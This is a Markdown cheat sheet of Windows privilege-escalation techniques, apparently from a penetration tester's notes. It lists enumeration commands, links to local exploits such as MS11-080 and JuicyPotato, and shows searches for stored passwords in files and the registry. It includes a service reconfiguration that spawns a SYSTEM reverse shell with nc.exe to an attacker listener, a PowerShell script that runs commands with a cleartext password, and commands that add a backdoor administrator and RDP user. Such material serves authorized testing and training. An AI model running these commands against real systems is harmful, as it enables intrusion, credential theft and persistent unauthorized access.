# Windows Privilege Escalation

## Table of Contents
* [Tips](#tips)
* [Notable Local Exploits](#notable-local-exploits)
* [Enumeration](#enumeration)
* [Powershell: Run command as another user](#powershell-run-command-as-another-user)
* [User Operations (to be leveraged during Privilege Escalation)](#user-operations-to-be-leveraged-during-privilege-escalation)


## Tips
* Check folder permissions on all directories in the %PATH% variable


## Notable Local Exploits
* MS11-080 (Windows XP and 2003; requires pyinstaller running on Windows): [https://www.exploit-db.com/exploits/18176](https://www.exploit-db.com/exploits/18176)
* [JuicyPotato](https://github.com/ohpe/juicy-potato)


## Enumeration

### Windows Privilege Escalation Checker
[https://github.com/pentestmonkey/windows-privesc-check](https://github.com/pentestmonkey/windows-privesc-check)

#### Usage
```
windows-exploit-suggester.py -i [FILE_CONTAINING_SYSTEMINFO_OUTPUT] -d [LATEST_DATABASE_FILE]
```

### [AccessChk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk)
* Recommended version (because it supports "/accepteula" flag): [v4.02](https://web.archive.org/web/20071007120748if_/http://download.sysinternals.com/Files/Accesschk.zip)

### Get general system information
```
systeminfo
```

### Get Security Privileges for current user
```
whoami /priv
```

### Get all users on system
```
net users
```

### Get all users in Administrators group
```
net localgroup administrators
```

### Get all network connection information
```
ipconfig /all
```

### Get routing table
```
route print
```

### Get ARP cache table
```
arp -A
```

### Get full verbose "Scheduled Tasks" list

#### Print list
```
schtasks /query /fo LIST /v
```

#### Print CSV
```
schtasks /query /fo CSV /v
```

#### Print table
```
schtasks /query /fo TABLE /v
```
**NOTE:** These may require admin on newer Windows systems.

### Get specific "Scheduled Task"
```
schtasks /query /TN
```

### Get running tasks (including services)
```
tasklist /svc
```

### Get list of currently-started services
```
net start
```

### List installed drivers
```
driverquery
```

### List patch level (ie. what patches are installed)
```
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

### Look for specific applied patches
```
wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB..."
```

### Look at Windows Firewall rules
```
net firewall
```
**XP SP2 or higher, may require admin on newer Windows systems**

### List all Windows Firewall Inbound rules
```
netsh advfirewall firewall show rule name=all dir=in type=dynamic
```

### List all installed Windows Service Names and Displayed Names
```
sc query type= service state= inactive | findstr "SERVICE_NAME: DISPLAY_NAME:"
```
**Note:** This will produce a lot of output

### List Windows services where "Authenticated Users" have write access
```
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
```
Ideally, we want to see services with SERVICE_ALL_ACCESS

### View current service options
```
sc qc [SERVICE_NAME]
```

### Use upnphost service to spawn a reverse shell as SYSTEM using nc.exe
```
sc config upnphost binpath= "[PATH_TO]\nc.exe -nv -e cmd.exe [LISTENER_IP] [LISTENER_PORT]" obj= ".\LocalSystem" password= ""
net start upnphost
```
**Note:** Requires admin privileges, or for upnphost to be configured with SERVICE_ALL_ACCESS

### Get all services with unquoted service paths
```
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
```

### Check file permissions (built-in)
```
icacls [FILE]
```
```
cacls [FILE]
```

### Search filesystem for files containing specific keywords (regex search)
```
dir /s *pass* == *cred* == *vnc* == *.config*
```

### Search filesystem for certain file types containing specific keyword (ex. password)
```
findstr /si password *.xml *.ini *.txt
```

### Find directories with weak file permissions
```
accesschk.exe /accepteula -uwdqs Users c:\
accesschk.exe /accepteula -uwdqs "Authenticated Users" c:\
```

### Find credentials in registry from configured "AutoLogin"
```
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
```


## Powershell: Run command as another user

### Create [runas.ps1](runas.ps1) Powershell script on target system
**Note:** Requires the other user's cleartext password; fill in ```[USERNAME]```, ```[PASSWORD]```, ```[COMMAND_NAME]```, ```[COMMAND_LOCATION]```, and ```[CMD_ARG...]``` values accordingly.
```
echo $username = '[USERNAME]' > runas.ps1
echo $securePassword = ConvertTo-SecureString "[PASSWORD]" -AsPlainText -Force >> runas.ps1
echo $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword >> runas.ps1
echo Start-Process -FilePath '[COMMAND_NAME]' -WorkingDirectory '[COMMAND_LOCATION]' -ArgumentList '[CMD_ARG1]','[CMD_ARG2]',...,'[CMD_ARGN]' -Credential $credential >> runas.ps1
```

### Execute runas.ps1
```
powershell -ExecutionPolicy Bypass -NoLogo -NonInteractive -File runas.ps1
```


## User Operations (to be leveraged during Privilege Escalation)

### Adding a user to target system (requires admin access or execution via a Service)
```
net user [USER] [PASSWORD] /add
```

### Add a user to the Administrators group (requires admin access or execution via a Service)
```
net localgroup administrators [USER] /add
```

### Enable RDP access for a user (requires admin access or execution via a Service)
```
net localgroup "Remote Desktop Users" [USER] /add
```

